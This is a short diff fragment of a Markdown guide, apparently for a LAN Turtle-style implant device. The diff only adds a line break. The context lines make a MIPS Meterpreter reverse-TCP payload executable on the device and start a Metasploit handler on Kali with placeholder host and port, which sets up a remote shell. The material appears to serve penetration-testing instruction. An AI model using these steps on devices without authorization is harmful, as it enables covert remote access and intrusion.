@@ -26,6 +26,7 @@
 `chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 
 **5 - On Kali: start Meterpreter listerner**<br />
+<br />
 `sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/mipsbe/meterpreter_reverse_tcp;set lhost <LHOST>;set LPORT <LPORT>;exploit -j"`<br />
 
 
